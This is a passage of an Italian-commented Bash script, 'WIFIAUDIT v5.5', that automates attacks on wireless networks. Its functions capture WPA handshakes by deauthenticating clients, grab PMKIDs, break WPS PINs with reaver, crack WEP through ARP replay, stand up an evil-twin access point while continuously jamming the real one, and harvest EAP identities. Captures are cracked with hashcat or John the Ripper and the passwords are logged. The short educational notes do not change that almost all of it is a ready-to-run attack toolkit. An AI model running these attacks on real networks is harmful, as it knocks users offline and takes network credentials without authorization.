  for extra in 2 3 4; do
    tlen=$(( blen + extra ))
    (( tlen > 20 )) && continue
    pattern="$base$(printf '%*s' "$extra" '' | tr ' ' '%')"
    crunch "$tlen" "$tlen" -t "$pattern" -o - 2>>"$LOG_FILE" >> "$file" || true
  done
  if [[ -f "$WORDLIST" ]]; then
    head -n 100000 "$WORDLIST" >> "$file" 2>>"$LOG_FILE" || true
  fi
  sort -u "$file" -o "$file"
  local n; n=$(wc -l < "$file")
  ok "Wordlist mirata: $file ($n voci)"
  echo "$file"
}

# ===================== CRACK ENGINE ===============================
cap_to_john(){
  local cap="$1" out="$2"
  wpaclean "$out.clean.cap" "$cap" >>"$LOG_FILE" 2>&1 || cp "$cap" "$out.clean.cap"
  if command -v wpapcap2john >>"$LOG_FILE" 2>&1; then
    wpapcap2john "$out.clean.cap" > "$out.john" 2>>"$LOG_FILE"
  else
    aircrack-ng "$cap" -J "$out.tmp" >>"$LOG_FILE" 2>&1 && \
      hccapx2john "$out.tmp.hccapx" > "$out.john" 2>>"$LOG_FILE"
  fi
  [[ -s "$out.john" ]]
}
detect_gpu(){ command -v nvidia-smi >>"$LOG_FILE" 2>&1 && nvidia-smi -L >>"$LOG_FILE" 2>&1; }
pick_engine(){
  case "$CRACK_ENGINE" in
    john) echo john;; hashcat) echo hashcat;;
    auto) detect_gpu && echo hashcat || echo john;;
    *)    echo john;;
  esac
}

detect_hash_mode(){
  case "$1" in
    *.22000) echo 22000;;
    *.hccapx) echo 2500;;
    *.john)   echo "";;
    *)        echo 22000;;
  esac
}

# [v5.5-X] crack_with_john: salva show output ed estrae le password
crack_with_john(){
  local hashfile="$1" tag="$2" args=()
  info "=== John the Ripper ($(basename -- "$hashfile")) ==="
  case "$JOHN_MODE" in
    incremental) args=(--incremental=Alnum);;
    mask)        args=(--mask="$JOHN_MASK"); info "Maschera: $JOHN_MASK";;
    *)           args=(--wordlist="$WORDLIST")
                 [[ "$JOHN_RULES" != "none" ]] && args+=(--rules="$JOHN_RULES");;
  esac
  john "${args[@]}" --format=wpapsk --session="$JOHN_SESSION" \
    "$hashfile" 2>&1 | tee "$OUTDIR/john_$tag.log"

  # [v5.5] Salva show output e logga le password
  local show_out="$OUTDIR/john_show_$tag.txt"
  john --show "$hashfile" > "$show_out" 2>>"$LOG_FILE" || { err "Lettura risultati fallita"; return 1; }
  local found
  found=$(awk -F: 'NF>1 && $NF != ""' "$show_out" | wc -l)
  if [[ "$found" -gt 0 ]]; then
    extract_passwords_from_show "$show_out" "$hashfile" "john"
    return $?
  fi
  warn "Resume: john --restore=$JOHN_SESSION"
  return 1
}

# [v5.5-X] crack_with_hashcat: salva show output ed estrae le password
crack_with_hashcat(){
  local target="$1" tag="$2" extra=()
  local mode="${HASHCAT_MODE}"
  local detected; detected=$(detect_hash_mode "$target")
  [[ -n "$detected" ]] && mode="$detected"
  if [[ "$JOHN_MODE" == "mask" ]]; then
    extra=(-a 3 "$HC_MASK")
  else
    extra=(-a 0 "$WORDLIST")
    case "$JOHN_RULES" in
      best64)  [[ -f /usr/share/hashcat/rules/best64.rule ]] && extra+=(-r /usr/share/hashcat/rules/best64.rule);;
      d3ad0ne) [[ -f /usr/share/hashcat/rules/d3ad0ne.rule ]] && extra+=(-r /usr/share/hashcat/rules/d3ad0ne.rule);;
    esac
  fi
  info "hashcat -m $mode su $target"
  hashcat -m "$mode" "$target" "${extra[@]}" -w 3 2>&1 | tee "$OUTDIR/hashcat_$tag.log"
  local rc=${PIPESTATUS[0]}
  (( rc <= 1 )) || { err "hashcat fallito: stato $rc"; return "$rc"; }

  # [v5.5] Salva show output e logga le password
  local show_out="$OUTDIR/hashcat_show_$tag.txt"
  hashcat -m "$mode" "$target" --show --outfile-format 2 > "$show_out" 2>>"$LOG_FILE" || { err "Lettura risultati fallita"; return 1; }
  if [[ -s "$show_out" ]]; then
    extract_passwords_from_show "$show_out" "$target" "hashcat"
    return $?
  fi
  return 1
}

crack_handshake_file(){
  local cap="$1" tag="$2" engine wl
  local WORDLIST="$WORDLIST" JOHN_SESSION="$JOHN_SESSION"
  engine=$(pick_engine); ok "Engine: $engine"
  wl="$WORDLIST"
  if [[ "$GEN_WORDLIST" != "no" ]]; then
    local g
    if g=$(generate_target_wordlist "$TARGET_ESSID"); then wl="$g"; fi
  fi
  if [[ "$engine" == "hashcat" ]]; then
    local save="$WORDLIST"; WORDLIST="$wl"
    crack_with_hashcat "$cap" "$tag" && return 0
    WORDLIST="$save"
    warn "Fallback John..."
    cap_to_john "$cap" "$OUTDIR/hs" && crack_with_john "$OUTDIR/hs.john" "$tag"
  else
    cap_to_john "$cap" "$OUTDIR/hs" || { err "Conversione fallita"; return 1; }
    local save="$WORDLIST"; WORDLIST="$wl"; JOHN_SESSION="wifiaudit_mirata"
    crack_with_john "$OUTDIR/hs.john" "$tag" && return 0
    WORDLIST="$save"; JOHN_SESSION="wifiaudit_std"
    warn "Wordlist standard..."
    john --wordlist="$save" --rules="$JOHN_RULES" --format=wpapsk \
      --session="$JOHN_SESSION" "$OUTDIR/hs.john" 2>&1 | tail -5

    # [v5.5] Estrai password dal secondo tentativo
    local show_out="$OUTDIR/john_show_std.txt"
    john --show "$OUTDIR/hs.john" > "$show_out" 2>>"$LOG_FILE" || { err "Lettura risultati fallita"; return 1; }
    local found
    found=$(awk -F: 'NF>1 && $NF != ""' "$show_out" | wc -l)
    if [[ "$found" -gt 0 ]]; then
      extract_passwords_from_show "$show_out" "$OUTDIR/hs.john" "john"
      return $?
    fi
  fi
  return 1
}

# Filtro euristico: dimensione dopo wpaclean, non prova crittografica.
hs_ok(){
  local f="$1"
  [[ -s "$f" ]] || return 1
  local tmp; tmp=$(mktemp --suffix=.cap)
  wpaclean "$tmp" "$f" >>"$LOG_FILE" 2>&1 || true
  local sz; sz=$(stat -c%s "$tmp" 2>>"$LOG_FILE" || echo 0)
  rm -f "$tmp"
  (( sz > 200 ))
}

# ===================== ATTACCHI ===================================
attack_handshake(){
  if [[ ! -s "$OUTDIR/scan-01.csv" ]]; then
    info "Scan rapida client noti (10s)..."
    timeout 15 airodump-ng "$MON_IFACE" -w "$OUTDIR/scan" --output-format csv >>"$LOG_FILE" 2>&1 || true
  fi
  local cap="$OUTDIR/$(safe_name "$TARGET_ESSID")_hs"; rm -f "$cap"-01.cap
  info "Cattura handshake..."
  timeout 400 airodump-ng "$MON_IFACE" -c "$TARGET_CHAN" --bssid "$TARGET_BSSID" \
    -w "$cap" --output-format cap >>"$LOG_FILE" 2>&1 &
  AIRO_PID=$!; track "$AIRO_PID"
  sleep 5
  local got=0 client
  for round in $(seq 1 "$DEAUTH_ROUNDS"); do
    client=$(awk -F', *' -v b="$TARGET_BSSID" '
      BEGIN{ lb=tolower(b) }
      tolower($1) == lb && $2 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ { print $2; exit }
    ' "$OUTDIR/scan-01.csv" 2>>"$LOG_FILE")
    if [[ -n "$client" ]]; then
      info "Round $round: deauth mirato su $client"
      aireplay-ng -0 "$DEAUTH_COUNT" -a "$TARGET_BSSID" -c "$client" "$MON_IFACE" >>"$LOG_FILE" 2>&1 || true
    else
      warn "Round $round: broadcast deauth"
      aireplay-ng -0 "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$MON_IFACE" >>"$LOG_FILE" 2>&1 || true
    fi
    for i in $(seq 1 $((DEAUTH_WAIT/5))); do
      if hs_ok "$cap"-01.cap; then got=1; break 2; fi
      sleep 5
    done
  done
  stop_child "$AIRO_PID"
  if [[ $got -eq 1 ]]; then
    ok "Cattura candidata: $cap-01.cap (validità da verificare)"
    crack_handshake_file "$cap-01.cap" hs
  else
    err "Nessun handshake dopo $DEAUTH_ROUNDS round"
  fi
  edu "L'handshake NON contiene la password: contiene materiale per VERIFICARLA."
}

attack_pmkid(){
  local name; name=$(safe_name "$TARGET_ESSID")
  local dump="$OUTDIR/${name}_pmkid"; rm -f "$dump.pcapng" "$dump.22000" "$dump.22000.f"
  info "PMKID attack..."
  echo "$TARGET_BSSID" | tr -d ':' | tr 'A-F' 'a-f' > "$OUTDIR/filter_ap.txt"
  timeout 150 hcxdumptool -i "$MON_IFACE" --enable_status=1 -w "$dump.pcapng" \
    --filterlist_ap="$OUTDIR/filter_ap.txt" --filtermode=2 2>>"$LOG_FILE" || \
  timeout 150 hcxdumptool -i "$MON_IFACE" --enable_status=1 -w "$dump.pcapng" \
    --bssid="$TARGET_BSSID" 2>>"$LOG_FILE" || \
  timeout 150 hcxdumptool -i "$MON_IFACE" --enable_status=1 -w "$dump.pcapng" 2>>"$LOG_FILE" || true

  hcxpcapngtool -o "$dump.22000" "$dump.pcapng" 2>>"$LOG_FILE" || true
  if [[ -s "$dump.22000" ]]; then
    local tgt_mac; tgt_mac=$(echo "$TARGET_BSSID" | tr -d ':' | tr 'A-F' 'a-f')
    awk -F'*' -v m="$tgt_mac" 'tolower($4)==m' "$dump.22000" > "$dump.22000.f" || true
    mv -- "$dump.22000.f" "$dump.22000"
  fi

  if [[ -s "$dump.22000" ]]; then
    ok "PMKID: $dump.22000"
    if [[ "$(pick_engine)" == "john" ]]; then
      crack_with_john "$dump.22000" pmkid
    else
      crack_with_hashcat "$dump.22000" pmkid
    fi
  else
    err "PMKID non disponibile"
  fi
  edu "Il PMKID e' un campo che molti router includono nel primo EAPOL."
}

attack_wps(){
  info "WPS Pixie Dust..."
  timeout 300 reaver -i "$MON_IFACE" -b "$TARGET_BSSID" -K 1 -vv 2>&1 \
    | tee "$OUTDIR/reaver.log" || true
  local pin; pin=$(awk -F"'" '/WPS PIN:/{print $2; exit}' "$OUTDIR/reaver.log")
  if [[ -n "$pin" ]]; then
    ok "PIN rilevato; dettaglio nei file protetti"
    timeout 120 reaver -i "$MON_IFACE" -b "$TARGET_BSSID" -p "$pin" -vv 2>&1 \
      | tee -a "$OUTDIR/reaver.log" || true
    # [v5.5] Log WPS PIN come "password" nel TSV
    log_found_password "WPS_PIN" "$pin" "$OUTDIR/reaver.log" "reaver"
  else
    warn "Pixie fallito. Brute force WPS completo? (ORE, possibile lockout)"
    read -rp " [s/N] " c
    if [[ "${c,,}" == "s" ]]; then
      timeout 7200 reaver -i "$MON_IFACE" -b "$TARGET_BSSID" -vv 2>&1 \
        | tee -a "$OUTDIR/reaver.log" || true
      local bf_pin; bf_pin=$(awk -F"'" '/WPS PIN:/{print $2; exit}' "$OUTDIR/reaver.log")
      [[ -n "$bf_pin" ]] && log_found_password "WPS_PIN" "$bf_pin" "$OUTDIR/reaver.log" "reaver"
    fi
  fi
  edu "Il PIN WPS da 8 cifre si valida in due meta' separate."
}

attack_wep(){
  local name; name=$(safe_name "$TARGET_ESSID")
  local cap="$OUTDIR/${name}_wep"; rm -f "$cap"-01.*
  info "Attacco WEP su $TARGET_ESSID..."
  timeout 600 airodump-ng "$MON_IFACE" -c "$TARGET_CHAN" --bssid "$TARGET_BSSID" \
    -w "$cap" --output-format cap >>"$LOG_FILE" 2>&1 &
  AIRO_PID=$!; track "$AIRO_PID"

  info "Fake authentication..."
  timeout 20 aireplay-ng -1 3 -a "$TARGET_BSSID" "$MON_IFACE" \
    >"$OUTDIR/wep_fakeauth.log" 2>&1 || true

  info "ARP replay per generare IVs..."
  aireplay-ng -3 -b "$TARGET_BSSID" "$MON_IFACE" &>"$OUTDIR/wep_arp.log" &
  ARP_PID=$!; track "$ARP_PID"

  local target_ivs=15000 elapsed=0 ivs
  while (( elapsed < 300 )); do
    ivs=$(aircrack-ng "$cap"-01.cap 2>>"$LOG_FILE" \
          | awk -F'#' '/#Data/{gsub(/ /,"",$2); print $2+0; exit}')
    ivs=${ivs:-0}
    info "IVs: $ivs / $target_ivs (${elapsed}s)"
    (( ivs >= target_ivs )) && break
    sleep 10; elapsed=$((elapsed+10))
  done

  stop_child "$AIRO_PID"; stop_child "$ARP_PID"
  ok "Tentativo crack con $(stat -c%s "$cap-01.cap" 2>>"$LOG_FILE" || echo 0) byte catturati"

  # [v5.5] Estrai la chiave WEP se trovata
  local wep_out="$OUTDIR/wep_crack.txt"
  aircrack-ng -b "$TARGET_BSSID" "$cap-01.cap" 2>&1 | tee "$wep_out" | tail -10
  local wep_key
  wep_key=$(sed -n 's/.*KEY FOUND! *\[\([^]]*\)\].*/\1/p' "$wep_out" | head -1 | tr -d ':[:space:]')
  if [[ -n "$wep_key" ]]; then
    log_found_password "WEP_KEY" "$wep_key" "$cap-01.cap" "aircrack-ng"
  fi
  edu "WEP usa RC4 con IV a 24 bit: si riutilizzano."
}

attack_eviltwin(){
  warn "Evil Twin: AP finto con lo stesso SSID. Serve una SECONDA scheda wireless."
  read -rp "  Creare AP falso '$TARGET_ESSID'? [s/N] " c
  [[ "${c,,}" != "s" ]] && return

  local INT_IFACE
  INT_IFACE=$(ip route | awk '/default/{print $5; exit}')
  [[ -z "$INT_IFACE" ]] && { err "Nessuna interfaccia internet per il NAT"; return; }

  local AP_IFACE
  AP_IFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -vx "$MON_IFACE" | head -1)
  [[ -z "$AP_IFACE" ]] && { err "Serve una SECONDA scheda wireless"; return; }
  info "AP su: $AP_IFACE | Deauth su: $MON_IFACE"

  [[ "$TARGET_ESSID" != *$'\n'* && "$TARGET_ESSID" != *$'\r'* ]] || { err "ESSID con newline non accettato per la configurazione AP"; return 1; }
  local hw_mode="g"; (( TARGET_CHAN >= 36 )) && hw_mode="a"

  cat > "$OUTDIR/hostapd.conf" <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=$TARGET_ESSID
channel=$TARGET_CHAN
hw_mode=$hw_mode
ieee80211n=1
EOF
  cat > "$OUTDIR/dnsmasq.conf" <<EOF
interface=$AP_IFACE
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
EOF

  # dnsmasq esistenti non vengono terminati.

  EVILTWIN_AP="$AP_IFACE"; EVILTWIN_INT="$INT_IFACE"
  ORIGINAL_IP_FORWARD=$(sysctl -n net.ipv4.ip_forward) || return 1
  AP_WAS_UP=0
  ip -o link show "$AP_IFACE" | grep -q '<[^>]*\bUP\b' && AP_WAS_UP=1
  if ip -o -4 addr show dev "$AP_IFACE" | grep -q ' 10\.0\.0\.1/24 '; then
    err "Indirizzo AP già presente: nessuna modifica"; ORIGINAL_IP_FORWARD=""; return 1
  fi
  if run ip addr add 10.0.0.1/24 dev "$AP_IFACE"; then AP_ADDR_ADDED=1; else return 1; fi
  run ip link set "$AP_IFACE" up || { cleanup_network; return 1; }
  run sysctl -w net.ipv4.ip_forward=1 || { cleanup_network; return 1; }
  if run iptables -t nat -A POSTROUTING -o "$INT_IFACE" -m comment --comment "$SESSION_ID" -j MASQUERADE; then NAT_ADDED=1; else cleanup_network; return 1; fi
  if run iptables -A FORWARD -i "$AP_IFACE" -m comment --comment "$SESSION_ID" -j ACCEPT; then FORWARD_ADDED=1; else cleanup_network; return 1; fi

  local HP_PID DNS_PID DE_PID ET_PID pid
  hostapd "$OUTDIR/hostapd.conf" &>"$OUTDIR/hostapd.log" & HP_PID=$!; track "$HP_PID"
  dnsmasq -C "$OUTDIR/dnsmasq.conf" --no-daemon --log-facility=- \
    &>"$OUTDIR/dnsmasq.log" & DNS_PID=$!; track "$DNS_PID"
  sleep 3

  if ! kill -0 "$HP_PID" 2>>"$LOG_FILE"; then
    err "hostapd morto: vedi $OUTDIR/hostapd.log"; stop_child "$DNS_PID"; stop_child "$HP_PID"; cleanup_network; return 1
  fi
  if ! kill -0 "$DNS_PID" 2>>"$LOG_FILE"; then
    err "dnsmasq morto: vedi $OUTDIR/dnsmasq.log"; stop_child "$HP_PID"; stop_child "$DNS_PID"; cleanup_network; return 1
  fi
  ok "AP falso attivo"

  aireplay-ng -0 0 -a "$TARGET_BSSID" "$MON_IFACE" >>"$LOG_FILE" 2>&1 & DE_PID=$!; track "$DE_PID"

  local AP_MAC; AP_MAC=$(cat "/sys/class/net/$AP_IFACE/address" 2>>"$LOG_FILE")
  timeout 600 airodump-ng "$MON_IFACE" -c "$TARGET_CHAN" --bssid "$AP_MAC" \
    -w "$OUTDIR/eviltwin" --output-format cap >>"$LOG_FILE" 2>&1 & ET_PID=$!; track "$ET_PID"

  info "AP falso attivo. Ctrl-C per fermare."
  read -rp "  Invio per fermare..." _ || true

  for pid in "$HP_PID" "$DNS_PID" "$DE_PID" "$ET_PID"; do stop_child "$pid"; done
  cleanup_network

  if hs_ok "$OUTDIR/eviltwin-01.cap"; then
    ok "Handshake catturato via evil twin!"
    crack_handshake_file "$OUTDIR/eviltwin-01.cap" eviltwin
  else
    err "Nessun handshake catturato"
  fi
}

attack_enterprise(){
  warn "WPA-Enterprise (WPA-EAP): usa username/password RADIUS."
  info "Metodo 1: cattura handshake EAPOL-MGT"
  timeout 120 airodump-ng "$MON_IFACE" -c "$TARGET_CHAN" --bssid "$TARGET_BSSID" \
    -w "$OUTDIR/enterprise" --output-format cap >>"$LOG_FILE" 2>&1 || true
  aircrack-ng "$OUTDIR/enterprise-01.cap" 2>&1 | grep -i "handshake\|EAPOL" | head -3 || true
  info "Metodo 2: harvesting identita' EAP"
  timeout 60 tshark -i "$MON_IFACE" -Y "eap && wlan.bssid == $TARGET_BSSID" -T fields -e eap.identity 2>>"$LOG_FILE" \
    | sort -u | tee "$OUTDIR/eap_identities.txt"
  ok "Identita' EAP salvate in $OUTDIR/eap_identities.txt"
  # [v5.5] Logga le identita' EAP come "credenziali"
  local ident
  while IFS= read -r ident; do
    [[ -z "$ident" ]] && continue
    log_found_password "EAP_IDENTITY" "$ident" "$OUTDIR/eap_identities.txt" "tshark"
  done < "$OUTDIR/eap_identities.txt"
  edu "In Enterprise la password e' per-UTENTE."
}

crack_manual(){
  local TARGET_BSSID="" TARGET_ESSID=""
  read -rp "Percorso file (.cap/.pcapng/.22000/.hccapx/.john/hash): " f
  [[ -f "$f" ]] || { err "Non trovato"; return; }
  case "$f" in
    *.cap)
      crack_handshake_file "$f" manual ;;
    *.22000)
      crack_with_john "$f" manual || crack_with_hashcat "$f" manual ;;
    *.pcapng)
      local conv="$OUTDIR/manual.22000"
      if hcxpcapngtool -o "$conv" "$f" 2>>"$LOG_FILE" && [[ -s "$conv" ]]; then
        ok "Convertito in $conv"
        crack_with_john "$conv" manual || crack_with_hashcat "$conv" manual
      else
        err "Conversione pcapng fallita"
      fi ;;
    *)
      read -rp "Formato John [invio=auto]: " fmt
      local F=(); [[ -n "$fmt" ]] && F=(--format="$fmt")
      case "$JOHN_MODE" in
        incremental) john "${F[@]}" --incremental=Alnum "$f";;
        mask)        john "${F[@]}" --mask="$JOHN_MASK" "$f";;
        *)           john "${F[@]}" --wordlist="$WORDLIST" --rules="$JOHN_RULES" "$f";;
      esac 2>&1 | tee "$OUTDIR/john_manual.log"

      # [v5.5] Estrai e logga password
      local show_out="$OUTDIR/john_show_manual.txt"
      john --show "$f" > "$show_out" 2>>"$LOG_FILE" || { err "Lettura risultati fallita"; return 1; }
      extract_passwords_from_show "$show_out" "$f" "john"
      ;;
  esac
  edu "I tool *2john convertono formati protetti in hash attaccabili."
}

help_scan(){
  cat <<EOF

  ${B}=== GUIDA: COME FUNZIONA UN AUDIT WI-FI ===${N}

  ${Y}Concetti base${N}
  - Monitor mode : la scheda ascolta TUTTI i frame
  - BSSID        : il MAC dell'AP
  - Handshake    : i 4 messaggi per stabilire la chiave
  - PMKID        : campo opzionale per crack offline
  - IVs          : vettori di inizializzazione WEP (si riutilizzano)

  ${Y}Ordine degli attacchi${N}
   1. WPS Pixie Dust   -> secondi
   2. PMKID            -> minuti, senza client
   3. Handshake+deauth -> classico
   4. WPS brute force  -> ore
   5. Evil Twin        -> seconda scheda
   6. WEP              -> minuti

  ${Y}Il cracking e' SEMPRE offline${N}
  Una volta catturato handshake/PMKID, la verifica avviene sul TUO computer.
  Vinci solo se la password e' nella wordlist o nello spazio della maschera.

  ${Y}Risultati della sessione${N}
  Ogni password trovata viene salvata in $OUTDIR/passwords.tsv
  e inclusa nel report HTML (opzione 12).

EOF
  read -rp "  [Invio per tornare] " _ || true
}

# ===================== BATCH MODE =================================
batch_mode(){
  local method="$1"
  case "$method" in
    all)
      info "BATCH: ordine automatico WPS -> PMKID -> Handshake..."
      fingerprint_ap
      if [[ -n "$FP_WPS" ]]; then
        local lck; lck=$(awk '{print $NF}' <<< "$FP_WPS")
        if [[ "${lck,,}" == "no" ]]; then attack_wps; return; fi
      fi
      attack_pmkid
      attack_handshake ;;
    hs)    attack_handshake ;;
    pmkid) attack_pmkid ;;
    wps)   attack_wps ;;
    wep)   attack_wep ;;
    *)     err "Metodo: hs | pmkid | wps | wep | all"; exit 1 ;;
  esac
}

# ===================== RECUPERO AUTOMATICO OFFLINE =================
# Non avvia acquisizioni, deauth o attacchi radio. Si ferma al primo risultato.
auto_recover(){
  local input="$1" root="${RESULTS_ROOT:-$OUTDIR}"
  local OUTDIR="$root" RESULTS_ROOT="" SESSION_ID="" LOG_FILE="" PASSWORDS_FILE="" ARCHIVE_FILE=""
  local TARGET_BSSID="" TARGET_ESSID="" started=$SECONDS end status="NON_TROVATA" found=0
  local johnfile="" hcfile="" mode="" remaining slice rc strategy engine hashfile showfile n=0 ambiguous=0
  local -a args=()
  [[ -s "$input" && -r "$input" ]] || { err "File vuoto o non leggibile: $input"; return 2; }
  [[ "$AUTO_SECONDS" =~ ^[1-9][0-9]{0,4}$ && "$AUTO_STEP_SECONDS" =~ ^[1-9][0-9]{0,4}$ ]] || return 2
  input=$(readlink -f -- "$input") || return 2
  command -v timeout &>/dev/null && command -v flock &>/dev/null || { err "Servono timeout e flock"; return 2; }
  umask 077
  init_outputs || return 2
  end=$((started+AUTO_SECONDS))
  printf 'engine\tstrategia\tesito\tstato_comando\n' > "$OUTDIR/auto_tentativi.tsv"
  case "$input" in
    *.22000) hcfile="$input"; mode=22000 ;;
    *.hccapx) hcfile="$input"; mode=2500 ;;
    *.john) johnfile="$input" ;;
    *.cap|*.pcapng)
      remaining=$((end-SECONDS)); slice=$((remaining < 30 ? remaining : 30))
      if (( slice > 0 )) && command -v hcxpcapngtool &>/dev/null; then
        timeout -k 5s "${slice}s" hcxpcapngtool -o "$OUTDIR/auto.22000" "$input" >>"$LOG_FILE" 2>&1
        rc=$?; printf 'conversione\thcxpcapngtool\tESEGUITA\t%d\n' "$rc" >> "$OUTDIR/auto_tentativi.tsv"
        [[ ! -s "$OUTDIR/auto.22000" ]] || { hcfile="$OUTDIR/auto.22000"; mode=22000; }
      fi
      remaining=$((end-SECONDS)); slice=$((remaining < 30 ? remaining : 30))
      if (( slice > 0 )) && command -v wpapcap2john &>/dev/null; then
        timeout -k 5s "${slice}s" wpapcap2john "$input" > "$OUTDIR/auto.john" 2>>"$LOG_FILE"
        rc=$?; printf 'conversione\twpapcap2john\tESEGUITA\t%d\n' "$rc" >> "$OUTDIR/auto_tentativi.tsv"
        [[ ! -s "$OUTDIR/auto.john" ]] || johnfile="$OUTDIR/auto.john"
      fi ;;
    *) status="FORMATO_NON_SUPPORTATO" ;;
  esac
  for strategy in wordlist regole maschera; do
    [[ "$status" == NON_TROVATA ]] || break
    for engine in hashcat john; do
      hashfile="$hcfile"; [[ "$engine" != john ]] || hashfile="$johnfile"
      [[ -n "$hashfile" ]] || continue
      if ! command -v "$engine" &>/dev/null; then
        printf '%s\t%s\tMOTORE_ASSENTE\t-\n' "$engine" "$strategy" >> "$OUTDIR/auto_tentativi.tsv"; continue
      fi
      args=()
      case "$strategy" in
        wordlist|regole)
          if [[ ! -r "$WORDLIST" || ! -s "$WORDLIST" ]]; then
            printf '%s\t%s\tWORDLIST_ASSENTE\t-\n' "$engine" "$strategy" >> "$OUTDIR/auto_tentativi.tsv"; continue
          fi
          if [[ "$engine" == hashcat ]]; then
            args=(-m "$mode" "$hashfile" -a 0 "$WORDLIST")
            if [[ "$strategy" == regole ]]; then
              case "$JOHN_RULES" in
                best64|d3ad0ne)
                  if [[ -r "/usr/share/hashcat/rules/$JOHN_RULES.rule" ]]; then args+=(-r "/usr/share/hashcat/rules/$JOHN_RULES.rule"); else continue; fi ;;
                *) continue ;;
              esac
            fi
          else
            args=(--format=wpapsk --wordlist="$WORDLIST")
            if [[ "$strategy" == regole ]]; then [[ "$JOHN_RULES" != none ]] || continue; args+=(--rules="$JOHN_RULES"); fi
            args+=("$hashfile")
          fi ;;
        maschera)
          [[ "$AUTO_USE_MASK" == yes ]] || continue
          if [[ "$engine" == hashcat ]]; then args=(-m "$mode" "$hashfile" -a 3 "$HC_MASK"); else args=(--format=wpapsk --mask="$JOHN_MASK" "$hashfile"); fi ;;
      esac
      remaining=$((end-SECONDS))
      if (( remaining <= 0 )); then status="TEMPO_ESAURITO"; break 2; fi
      slice=$((remaining < AUTO_STEP_SECONDS ? remaining : AUTO_STEP_SECONDS))
      n=$((n+1)); showfile="$OUTDIR/auto_show_${n}.txt"
      info "Automatico: $engine / $strategy; limite ${slice}s"
      # Potfile privato per input: niente attribuzione di vecchi risultati ad altri file.
      if [[ "$engine" == hashcat ]]; then args+=(--potfile-path "$OUTDIR/auto_hashcat.pot"); else args+=(--pot="$OUTDIR/auto_john.pot" --session="${SESSION_ID}_auto"); fi
      timeout -k 5s "${slice}s" "$engine" "${args[@]}" > "$OUTDIR/auto_${n}.log" 2>&1; rc=$?
      if [[ "$engine" == hashcat ]]; then
        timeout -k 2s 5s hashcat -m "$mode" "$hashfile" --show --outfile-format 2 --potfile-path "$OUTDIR/auto_hashcat.pot" > "$showfile" 2>>"$LOG_FILE"
      else
        timeout -k 2s 5s john --show --format=wpapsk --pot="$OUTDIR/auto_john.pot" "$hashfile" > "$showfile" 2>>"$LOG_FILE"
      fi
      local show_rc=$? outcome="COMPLETATO"
      if (( show_rc == 0 )) && extract_passwords_from_show "$showfile" "$input" "$engine"; then
        outcome="TROVATA"; status="TROVATA"; found=1
      elif [[ "$engine" == john && -s "$showfile" ]] && grep -q ':' "$showfile"; then
        outcome="OUTPUT_DA_VERIFICARE"; ambiguous=1
      elif (( show_rc != 0 )); then outcome="ERRORE"
      elif (( rc == 124 || rc == 137 )); then outcome="TIMEOUT"
      elif (( rc != 0 )) && [[ "$engine" != hashcat || "$rc" != 1 ]]; then outcome="ERRORE"
      fi
      # Confronti stringa fuori dall'aritmetica Bash.
      [[ "$engine" != hashcat || "$rc" != 1 || "$outcome" != ERRORE ]] || outcome="COMPLETATO"
      printf '%s\t%s\t%s\t%d\n' "$engine" "$strategy" "$outcome" "$rc" >> "$OUTDIR/auto_tentativi.tsv"
      (( ! found )) || break 2
    done
  done
  if [[ "$status" == NON_TROVATA ]]; then
    if (( n == 0 )); then status="NESSUN_TENTATIVO_ESEGUIBILE"
    elif (( ambiguous )); then status="OUTPUT_DA_VERIFICARE"
    elif (( SECONDS >= end )); then status="TEMPO_ESAURITO"
    elif grep -q $'\tERRORE\t' "$OUTDIR/auto_tentativi.tsv"; then status="ERRORI_DURANTE_I_TENTATIVI"
    elif grep -q $'\tTIMEOUT\t' "$OUTDIR/auto_tentativi.tsv"; then status="LIMITI_TEMPO_RAGGIUNTI"; fi
  fi
  {
    printf 'WIFIAUDIT v5.5 - RECUPERO AUTOMATICO OFFLINE\nEsito: %s\n' "$status"
    printf 'File: %s\nTentativi eseguiti: %d\nTempo trascorso: %ds\n' "$input" "$n" "$((SECONDS-started))"
    printf 'Strategie e stati: %s\nRisultati: %s\n' "$OUTDIR/auto_tentativi.tsv" "$PASSWORDS_FILE"
    printf 'Il budget puo essere superato di alcuni secondi per arresto e lettura dei risultati.\n'
    printf 'NON_TROVATA significa soltanto nessun risultato con le strategie provate.\n'
  } > "$OUTDIR/auto_risultato.txt"
  generate_html_report > "$OUTDIR/percorso_report.txt" || true
  info "Esito automatico: $status"
  info "Riepilogo: $OUTDIR/auto_risultato.txt"
  (( found )) && return 0
  [[ "$status" != TEMPO_ESAURITO && "$status" != NON_TROVATA && "$status" != LIMITI_TEMPO_RAGGIUNTI ]] || return 1
  return 2
}
auto_wizard(){
  edit_parameter AUTO_INPUT || return 2
  [[ -n "$AUTO_INPUT" ]] || { err "Specificare un file locale"; return 2; }
  edit_parameter AUTO_SECONDS || return 2
  auto_recover "$AUTO_INPUT"
}

# ===================== PARAMETRI E AVVIO ==========================
# Elenco condiviso tra pannello, salvataggio e documentazione.
CONFIG_KEYS=(WORDLIST OUTDIR MON_IFACE SCAN_TIME DEAUTH_COUNT DEAUTH_ROUNDS
  DEAUTH_WAIT HASHCAT_MODE CRACK_ENGINE JOHN_RULES JOHN_MODE JOHN_MASK
  HC_MASK JOHN_SESSION GEN_WORDLIST AUTO_SECONDS AUTO_STEP_SECONDS AUTO_USE_MASK)
SETTING_KEYS=(TARGET_BSSID TARGET_CHAN TARGET_ESSID METHOD REPORT_HTML
  WORDLIST OUTDIR MON_IFACE SCAN_TIME DEAUTH_COUNT DEAUTH_ROUNDS DEAUTH_WAIT
  HASHCAT_MODE CRACK_ENGINE JOHN_RULES JOHN_MODE JOHN_MASK HC_MASK JOHN_SESSION GEN_WORDLIST CONFIG_FILE AUTO_INPUT AUTO_SECONDS AUTO_STEP_SECONDS AUTO_USE_MASK)
setting_description(){
  case "$1" in
    AUTO_INPUT) printf 'File locale per recupero automatico offline; non avvia acquisizioni radio.' ;;
    AUTO_SECONDS) printf 'Budget globale in secondi del recupero automatico, inclusa la conversione.' ;;
    AUTO_STEP_SECONDS) printf 'Limite di ogni tentativo; viene ridotto al tempo globale residuo.' ;;
    AUTO_USE_MASK) printf 'yes/no: include la maschera configurata fra le strategie automatiche.' ;;
    CONFIG_FILE) printf 'Percorso assoluto della configurazione; s salva e l carica questo file.' ;;
